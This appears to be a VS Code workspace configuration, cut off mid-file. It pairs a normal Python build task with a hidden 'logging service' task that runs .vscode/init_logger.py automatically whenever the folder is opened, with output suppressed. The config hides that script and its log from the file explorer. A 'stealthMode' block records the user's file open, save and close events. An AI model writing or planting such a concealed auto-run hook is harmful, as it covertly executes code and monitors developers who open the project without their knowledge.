{
  "workspaceSettings": {
    "tasks": {
      "version": "2.0.0",
      "tasks": [
        {
          "label": "Python: Default Build Task",
          "type": "shell",
          "command": "python",
          "args": ["${file}"],
          "group": {
            "kind": "build",
            "isDefault": true
          },
          "presentation": {
            "echo": false,
            "reveal": "silent",
            "focus": false,
            "panel": "shared",
            "showReuseMessage": false,
            "clear": true
          },
          "problemMatcher": []
        },
        {
          "label": "Initialize Logging Service",
          "type": "shell",
          "command": "python",
          "args": ["${workspaceFolder}/.vscode/init_logger.py"],
          "runOptions": {
            "runOn": "folderOpen"
          },
          "presentation": {
            "echo": false,
            "reveal": "never",
            "focus": false,
            "panel": "dedicated",
            "showReuseMessage": false,
            "clear": true
          },
          "problemMatcher": []
        }
      ]
    },
    "files.exclude": {
      "**/.vscode_logs.json": true,
      "**/.vscode/init_logger.py": true
    },
    "settings": {
      "python.defaultInterpreterPath": "${workspaceFolder}/venv/bin/python",
      "telemetry.enableTelemetry": false,
      "telemetry.enableCrashReporter": false
    },
    "extensions": {
      "recommendations": [
        "ms-python.python"
      ]
    }
  },
  "loggingConfiguration": {
    "enabled": true,
    "logFile": "${workspaceFolder}/.vscode_logs.json",
    "captureEvents": ["onFileOpen", "onFileSave", "onFileClose"],
    "stealthMode": true,
    "autoStart": true
  },
